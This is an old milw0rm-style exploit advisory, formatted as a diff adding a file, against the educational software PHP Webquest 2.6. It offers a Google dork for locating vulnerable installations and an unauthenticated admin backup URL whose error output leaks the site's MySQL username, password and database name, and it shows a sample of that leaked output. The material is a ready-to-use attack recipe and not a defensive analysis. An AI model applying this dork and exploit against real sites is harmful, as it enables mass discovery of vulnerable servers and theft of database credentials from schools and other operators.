@@ -1,0 +1,33 @@
+--==+================================================================================+==--
+--==+		          PHP Webquest 2.6 Get Database's Credential	             +==--
+--==+================================================================================+==--
+
+ Author: MhZ91
+ Title: PHP Webquest 2.6 Get Database's Credential
+ Download: http://phpwebquest.org/descargas/phpwebquest-2.6-international.zip
+ Bug: Get Database's Credential 
+ Info: PHP Webquest is a free educational software developed in order to help those teachers who want to create their own activities without the need of wrtitng any HTML code or uploading files to a web server. If you want to install it at your school’s server, please click on the image of the International Version.
+ Dork: "PHP WEBQUEST VERSION " or inurl:"/phpwebquest/" 
+ Visit: http://www.inj3ct-it.org
+
+
+[*]----------------------------------------------------------
+
+Poc: 
+
+The exploit work only if the function system(); is enabled on the server.. because it return a message whit the db credentials..
+We can get the file of the backup, and it return this:
+
+<H1>Error ejecutando comando: /usr/bin/mysqldump -u xxx --password=xxx1 --opt xx2</H1>
+
+Where xxx is the mysql login, xxx1 the password and xx2 the name of database.
+
+[*]----------------------------------------------------------
+
+Exploit:
+
+http://[www.example.com]/admin/backup_phpwebquest.php
+
+[*]----------------------------------------------------------
+
+# milw0rm.com [2008-01-09]
